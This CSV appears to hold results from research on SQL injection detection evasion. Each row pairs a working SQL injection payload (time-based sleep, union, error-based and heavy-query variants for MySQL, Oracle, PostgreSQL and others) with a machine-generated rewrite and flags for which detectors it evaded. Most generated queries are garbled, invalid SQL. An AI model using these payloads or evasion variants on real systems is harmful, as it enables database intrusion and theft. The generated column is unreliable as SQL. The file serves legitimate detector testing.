,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
7446,"1'+(select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'","SELECT MIN(select) FROM SQL injection detection WHERE 1117 = 1117 AND all_users t3,all_users t3,all_users t4,all_users t5) +'",0,1,0,0,0,0,0
7447,"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""bqfj"" like ""bqfj","SELECT md5(0x4c4d6142) FROM ""SQFJ"" FROM SQL Injection RefJ""",1,1,0,0,1,0,0
7448,"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('plfa'='plfa","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM sysibm.systables as t1,sysibm.systables as t3) and (plfa = 'plfa')",1,1,0,0,0,0,0
7449,"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('xmwj'='xmwj","SELECT dbms_pipe.receive_message(chr(67)||chr(101),) FROM SQL_injection",1,1,0,0,1,0,0
7450,"1'+(select 'tzyz' where 4912=4912 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","SELECT MIN(select'seq injection') FROM SQL_injection WHERE 4912 = 4912 = 4912 OR 6979 = like('abcdefg',upper(hex(randomblob(500000000000000000000000000000000000000000000000/2))",1,1,0,0,1,0,0
7451,1') and 4595=4595#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1' AND 4595 = 4595 = 4595,1,1,0,0,0,0,0
7452,"1%"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""","SELECT DISTINCT t1.select case 6240 FROM SQL injection AS t1 JOIN 6240 = 'qqpjq' AND t1.%"" = '%'",0,1,0,0,0,0,0
7453,"-4085'+(select aipn where 5493=5493 union all select 5493,5493,5493,5493,5493,5493,5493#",SELECT MIN(select aipn) FROM SQL_injection WHERE 5493 = 5493,1,1,0,1,1,1,0
7454,"-3151%""))) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) ='sql',1,1,0,0,1,0,0
7455,"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT MIN(select count(*) FROM SQL injection detection WHERE sysusers as sys1,sysusers as sys4,sysusers as sys4,sysusers as sys7)--",1,1,0,0,0,0,0
7456,"-1030"" where 2161=2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT 2161 = 2161 = 2161,1,1,0,1,0,0,0
7457,"1%'))) and 8635=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM generate_series(1,5000000)",1,1,0,0,0,0,0
7458,"-9133"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""crfy""=""crfy",SELECT MIN(case) FROM SQL injection detection) ORDER BY MIN(sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113),0,1,0,0,0,0,0
7459,"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7460,"1"";iif(2084=5671,1,1/0)","SELECT MIN(2084 = 5671,1,1/0) FROM SQL injection",1,1,0,0,0,0,0
7461,"1'||(select 'jmao' where 3009=3009;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7462,"-6770"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",SELECT MIN(case) FROM SQL injection detection),0,0,1,1,1,1,1
7463,1';begin dbms_lock.sleep(5); end and 'aenf'='aenf,SELECT MIN(end) FROM SQL injection detection,1,0,1,1,1,1,1
7464,-6377' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'qcms' like 'qcms,SELECT MIN(case) FROM SQL injection detection) FROM Query: -6377' OR –chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(112)| dbms_utility.sqlid_to_sqlhash(sqlid_to_sqlhash(sqlid_to_sqlhash((chr(4747)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(113)|chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(11,0,1,0,0,0,0,0
7465,"-2803') as jciy where 1130=1130 or make_set(4599=6550,6550)--","SELECT MIN(4599 = 6550,6550) FROM SQL injection AS t1 JOIN Query: -2803') AS t2 ON t1.jciy = t2.jciy WHERE t2.1130 = 1130 = 1130 OR t2.make_set(4599 = 6550,6550)--",0,1,1,0,0,0,0
7466,"-8629 where 8049=8049 union all select 8049,8049,8049,8049,8049,8049,8049#","SELECT MIN(8049 = 8049,8049,8049,8049#) FROM SQL injections WHERE NOT SELECT MIN(8049 = 8049,8049 = 8049",1,1,0,0,0,0,0
7467,"1%') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('%'='","SELECT DISTINCT %=', 'SQL' FROM SQL injection'",1,1,0,0,0,0,0
7468,"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""pdqm"" like ""pdqm","SELECT pdqm FROM ""sql injection detection"" FROM SQL SELECT pdqm FROM ""repeat""",1,0,1,1,1,1,1
7469,"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",SELECT MIN(case) FROM SQL injection detection WHERE SELECT MIN(select) ='sql injection',0,1,0,0,1,0,0
7470,1 where 3502=3502 order by 1--,SELECT * FROM query: 1 WHERE NOT SQL_injection = 1 ORDER BY 1--,1,1,1,0,0,0,0
7471,"1"");select count(*) from generate_series(1,5000000) and (""kngx"" like ""kngx","SELECT COUNT(*) FROM generate_series(1,5000000) and (""kngx"" = 'evade sq injection detection'",1,1,0,0,0,0,0
7472,"elt(8192=8192,sleep(5))","SELECT * FROM query: elt(8192 = 8192,sleep(5)) FROM SQL query: elt(8192 = 8192 = ""valid""",1,1,0,0,1,0,0
7473,"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SQL_injection FROM SQL_injection WHERE 3880 = 3880 AND all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
7474,"1) as hywx where 1424=1424 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection WHERE t2.select count(*) ='sql injection',0,1,0,0,1,0,0
7475,1%';select case when 7717=7717 then 1 else null end--,SELECT MIN(select case) FROM SQL injection detection WHERE 7717 = 7717 = 7717 AND NOT 7717 = 7717 AND NOT 77LL end--,0,1,0,0,0,0,0
7476,1));select sleep(5)#,SELECT DISTINCT esq_injection FROM SQL_injection WHERE NOT SELECT SELECT DISTINCT sleep(5)# FROM SQL,0,1,0,1,1,1,0
7477,-9509'))) or 1091=5477 and ((('gsmz'='gsmz,SELECT DISTINCT esq_injection FROM SQL_injection WHERE NOT _9509') = '1091=5477' ORDER BY 'gsmz',1,1,0,0,0,0,0
7478,"1 where 3799=3799 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","SELECT NOT SQL_substring(repeat(right(right(5012),5000000000) FROM SQL_inject = ""3799 = 3799"" AND NOT NOT real_inject ='sq injection'",1,1,0,0,1,0,0
7479,1) where 9683=9683;select (case when (1082=6755) then 1082 else 1082*(select 1082 from mysql.db) end)#,"SELECT 102 AS _102*(select) FROM SQL injection_description WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM 9683 = 9683 = 9683 = 6755) AND STRFTIME('%y', 1082 = 102*(select) FROM SQL SELECT 102 FROM mysql.db) end)# FROM SQL injection detection",0,1,0,0,1,0,0
7480,"-5643')) union all select 1515,1515#","SELECT 1515,1515# FROM SQL injection_description WHERE NOT SELECT MIN(SQL) FROM query: -5643'))",0,1,0,0,1,0,0
7481,"-2951"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
7482,"1"" where 9618=9618 and (3020=3020)*6703--",SELECT MIN(3020)*6703-- FROM SQL injection AS _executive FROM SQL_injector WHERE 9618 = 9618 = 9618 AND (3020 = 3020)*6703--,1,1,0,0,0,0,0
7483,1'||(select 'yydv' from dual where 9639=9639;select case when 8514=3207 then 1 else null end--,SELECT MIN(select) FROM SQL injection detection WHERE 9639 = 9639 = 9639;select case when 8514 = 3207 AND NOT end-- SELECT 1 FROM SQL injection detection,0,1,0,0,1,0,0
7484,"make_set(8734=8734,sleep(5))","SELECT NOT SQL_inject_set(8734 = 8734,sleep(5)) FROM query: SELECT created FROM query: make_set(8734 = 8734 = 8734,sleep(5)",1,1,0,0,1,0,0
7485,1'||(select 'awba' from dual where 3749=3749 and 1445=3334--,SELECT'seq injection detection' FROM SQL SELECT SELECT 'awba' FROM SQL SELECT MIN(3749 = 3749) FROM query: 1'||(select 'awba') FROM SQL SELECT SELECT'sq injection detection' FROM Query: 1'||(select 'awba' FROM SQL SELECT MIN(3749 = 3749 = 3749) FROM query: 1'||(select 'awba' FROM SQL SELECT MIN(select 'awba' FROM SQL SELECT MIN(3749 = 3749 = 3749 = 334--',1,1,0,0,1,0,0
7486,-8370')) or (3501=6407)*6407 and (('agcm' like 'agcm,SELECT DISTINCT 'evade SQL injection detection' FROM SQL SELECT MIN(sql injection) or ((sql = 'agcm'),1,1,0,0,0,0,0
7487,"-8566"") as hnch where 3418=3418 union all select 3418,3418,3418,3418,3418,3418,3418#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 3418 = 3418 = 3418,1,1,1,0,1,1,0
7488,"-7715') union all select 4830,4830,4830,4830,4830,4830,4830,4830--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -7715'),1,1,0,0,1,0,0
7489,"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
7490,"1))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7491,"1))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((9474=9474","SELECT * FROM SQL_injection_details, SELECT * FROM SQL_injection_ml(1808,concat(0x7171706a71,(((9474 = 9474)",1,1,0,0,1,0,0
7492,1' and sleep(5),SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: 1' AND sleep(5),1,1,0,0,1,0,0
7493,"1""))) union all select null,null,null,null,null,null,null#","SELECT null,null,null FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL",1,1,1,1,1,1,1
7494,1%');waitfor delay '0:0:5' and ('%'=',SELECT MIN(%)=' FROM SQL injection detection,0,1,0,0,1,0,0
7495,"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('qvoy'='qvoy","SELECT COUNT(*) FROM all_users WHERE NOT all_users = ""sql injection detection""",1,1,0,0,1,0,0
7496,"-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT i_engine_diagnosis ='sql',1,0,1,1,1,1,1
7497,1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (3945=3945,SELECT MIN(select case 6240) FROM SQL injection detection,0,0,0,1,1,1,0
7498,"1"" where 4445=4445 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",SELECT MIN(exactvalue(500000) FROM SQL injection) FROM SQL_inject JOIN Query: 1' AND NOT md5(0x52515a50) = 4445 = 4445 = 4445,0,1,0,0,1,0,0
7499,"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('dfsj'='dfsj","SELECT DISTINCT t1.select count(*) FROM SQL_injection_details AS t1 JOIN generate_series(1,5000000) and 8407 ='select count(*)'",0,1,0,0,0,0,0
7500,"1%'))) union all select null,null,null#","SELECT null,null,null FROM SQL SELECT MIN(sql injection detection) FROM SQL SELECT MIN(sql injection detection) FROM SQL",1,1,1,1,1,1,1
7501,-4582)) as gvfo where 8885=8885 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,"SELECT MIN(select) FROM SQL injection, SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select)|chr(112)||chr(112)|chr(select) FROM SQL SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SQL",0,1,0,0,1,0,0
7502,"1"")));select benchmark(5000000,md5(0x714e4153))#","SELECT 5000000,md5(0x714e4153) FROM SQL injection_description",1,1,0,1,1,1,0
7503,-3880) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (5194=5194,SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(5194 ='sql injection'),0,1,0,0,1,0,0
7504,"1"") where 1673=1673 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",SELECT MIN(sql) FROM SQL injection_message WHERE 1673 = 1673 OR 7427 = dbms_pipe.receive_message(chr(87)||chr(109),1,1,0,0,1,0,0
7505,"1"" where 8697=8697 and elt(3114=3114,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_description WHERE 8697 = 8697 = 8697 AND elt(3114 = 3114,sleep(5))# = ""sql injection detection""",0,1,0,0,0,0,0
7506,"1')) union all select null,null,null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null, null-- sw - 1')) FROM SQL SELECT SUM(swich FROM SQL SELECT SUM(null,null,null,null,null,null,null,null,null,null,null,null,null FROM SQL SELECT MIN(sql,null FROM SQL SELECT SUM(null,null,null,null,null FROM SQL SELECT SUM(swich) FROM SQL SELECT SUM",1,1,0,0,0,0,0
7507,1 and (select * from (select(sleep(5)))fzno),SELECT NOT SQL_inject_select(select(select(5)))fzno) FROM query: 1 AND NOT SQL_inject_select_from (select(sleep(5)))fzno),1,1,0,0,1,0,0
7508,"1"");select (case when (6839=2730) then 6839 else 6839*(select 6839 from mysql.db) end)#",SELECT 6839 FROM SQL injection (SELECT 6839 FROM mysql.db) end)# FROM SQL injection detection,1,1,0,1,1,1,0
7509,1'||(select 'xqqp' where 3007=3007 and (select * from (select(sleep(5)))gcrr)#,"SELECT MIN(select) FROM SQL injection detection WHERE ""3007 = 3007""",0,1,0,0,1,0,0
7510,"1"" where 8483=8483 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT MIN(repeat(left(crypt_key)||char(100) FROM SQL injection) FROM SELECT MIN(repeat(sql) FROM SELECT MIN(repeat(sql) FROM query: 1 WHERE 8483 = 8483 OR 8483 = 8483 OR char(117)||char(100) = regexp_substring(repeat(sql),1,1,0,0,1,0,0
7511,"1"" where 3247=3247 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SUM(*) FROM SQL_injection WHERE 3247 = 3247 = 3247 OR all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
7512,"-1451%') union all select 7666,7666,7666#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 7666,7666,7666# = ""done""",1,1,1,0,0,0,0
7513,"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""ccuy""=""ccuy",SELECT SUM(*) FROM SQL injection detection,1,0,1,1,1,1,1
7514,-4562') or 3038=3038,SELECT MIN(3038 = 3038 FROM SQL injection detection,1,1,0,1,1,1,0
7515,"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM SQL_injection) FROM rdb$fields as T1 JOIN SELECT rdb$functions FROM SQL SELECT rdb$functions FROM rdb$fields as T2 ON T1.rdb$collations = T2.rdb$functions as T3 ON T2.rdb$functions = T3.rdb$functions as t4",1,1,0,0,0,0,0
7516,"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('bgdp'='bgdp",SELECT * FROM (SELECT SUM(select) FROM SQL injection)) AND NOT (select ='sql injection'),0,1,0,0,1,0,0
7517,1) rlike sleep(5) and (5724=5724,SELECT * FROM query: 1) rlike sleep(5) and (5724 = 5724),1,1,0,0,1,0,0
7518,-3062')) or 6872=6872 and (('uzth' like 'uzth,SELECT MIN(((uzth) FROM SQL injection detection) FROM SQL injection detection,1,1,1,1,1,1,1
7519,"1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# couj",SELECT * FROM (SELECT SUM(select) FROM SQL injection)) AS couj FROM SQL_injection),0,0,0,0,1,0,0
7520,"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj","SELECT COUNT(*) FROM SELECT SELECT MIN(select count(*) FROM SQL injection detection WHERE NOT sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7) AND (""qblj"" = 'qblj'",1,1,0,0,0,0,0
7521,"1""));(select * from (select(sleep(5)))srmq) and ((""xeki"" like ""xeki","SELECT DISTINCT select(select(sleep(5))) FROM (SELECT ssrmq) FROM (SELECT ssl injection detection FROM SQL Query: 1"")",0,1,0,0,1,0,0
7522,"1%"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""",SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = 'SQ' ORDER BY SUM(%),1,0,0,0,0,0,0
7523,"1') as omtb where 1183=1183 and 8635=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM query_series(1,5000000) AS __executive_turn FROM SQL injection_diagnoses WHERE NOT omtb = 1183 = 1183 AND output_series(1,5000000) = 8635 = (select count(*) FROM generate_series(1,5000000)",1,1,0,0,0,0,0
7524,1))) and (select * from (select(sleep(5)))gcrr)#,SELECT * FROM (SELECT SUM(select(sleep(5))) FROM SQL injection detection),1,1,0,0,1,0,0
7525,"-4592"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""xvpz""=""xvpz","SELECT MIN(select) FROM SQL injection_defict_required FROM SQL_required WHERE NOT 440 = utl_inaddr.inaddr.chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)| xvpz"" FROM SQL_inaddr.xvpz ='sq injection'",0,1,0,0,1,0,0
7526,1 where 2649=2649 or (select * from (select(sleep(5)))ydpu)--,SELECT MIN(select(sleep(5))) FROM SQL injection detection,1,1,0,0,1,0,0
7527,-3998')) or 3038=3038,SELECT MIN(3038 = 3038 FROM SQL injection detection,1,1,0,1,1,1,0
7528,"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)","SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_injector WHERE NOT elt(1045 = 1045,7562) = 1210) GROUP BY elt(1045 = 1045",0,1,0,0,1,0,0
7529,"1%""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",SELECT MIN(((((((((((((((()%) FROM SQL injection)) FROM SQL injection detection),1,1,0,0,1,0,0
7530,"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7531,"-1830"")) as bptv where 4805=4805 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",SELECT MIN(case) FROM SQL injection detection WHERE 4805 = 4805 OR 4805 = 4805 OR 4144 = 4144 ='select upper(xmltype(chr(113)||chr(113)||chr(113)||chr(106)||chr(62)) FROM SQL,0,1,0,0,0,0,0
7532,"1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","SELECT NOT SQL_inject_message FROM SQL WHERE 8554 = 8554 OR 2633 = dbms_pipe.receive_message(chr(112)||chr(103),5-- if NOT SQL_inject_sq = '8554=8554' ORDER BY SQL_inject_message",1,1,0,0,0,0,0
7533,"1)) as acni where 6355=6355 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7534,1%') or sleep(5) and ('%'=',SELECT MIN(%'=) FROM SQL injection detection,0,1,0,0,1,0,0
7535,"1)) as shmg where 1371=1371 union all select null,null,null,null,null,null,null,null,null,null#","SELECT MIN(sql) FROM SQL - SELECT SUM(null) FROM sq insertion, SELECT SUM(null) FROM sq iv - swmg WHERE 1371 = 1371 = 1371",1,1,1,1,1,1,1
7536,-6145 or (8459=8459)*4906-- yklv,SELECT * FROM Query: -6145 ORDER BY query_code DESC LIMIT 1,1,1,1,1,1,1,1
7537,"1,(select * from generate_series(9108,9108,case when (9108=2900) then 1 else 0 end) limit 1)","SELECT MIN(select) FROM SQL_injection_details WHERE NOT SELECT * FROM generate_series(9108,9108,case when (9108 = 2900)",0,1,0,0,1,0,0
7538,"1') as uvxl where 6211=6211 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT ivxl_code = 6121 = 6211,0,1,0,0,1,0,0
7539,"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('lshk' like 'lshk",SELECT 'lshk' FROM SQL SELECT 'evade SQL injection detection' FROM table_repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(71)||char(71) ='sq injection',1,1,0,0,1,0,0
7540,"1"";begin dbms_lock.sleep(5); end--",SELECT MIN(end--) FROM SQL injection detection,1,1,1,1,1,1,1
7541,"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(hex(randomblob(500000000000/2)) FROM SQL injections,1,1,0,0,1,0,0
7542,"1"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM SQL_injection) FROM rdb$fields as t1,rdb$types as t3,rdb$functions as t4)--",1,1,0,0,1,0,0
7543,"1%"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""","SELECT MIN(*) FROM SQL injection detection WHERE NOT sysusers as sys1,sysusers as sysusers as sysusers as sys4,sysusers as sysusers as sys7) AND ""%"" = ""EXCEPT SELECT DISTINCT count(*) FROM SQL injection detection""",1,1,0,0,0,0,0
7544,-3431%') or 9323=9323#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -3431%' OR 9323 = 9323 = 9323,1,1,0,0,0,0,0
7545,"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""oyxk""=""oyxk",SELECT * FROM (SELECT * FROM SQL_injection) ORDER BY(select),0,0,0,0,1,0,0
7546,"1"") where 6632=6632 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","SELECT MIN(sql) FROM SQL injection_message WHERE 6632 = 6632 OR 2633 = dbms_pipe.receive_message(chr(112)||chr(103), -- if you are using SQL_injection",1,1,0,0,1,0,0
7547,"1%')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL_injection, SELECT MIN(select count(*) FROM SQL_injection) FROM rdb$fields as t1,rdb$types as t3,rdb$functions as t4)--",1,1,0,0,1,0,0
7548,1%')) rlike (select * from (select(sleep(5)))vwyq)#,SELECT DISTINCT select(select(sleep(5))) FROM SQL injection_detection,1,1,0,0,1,0,0
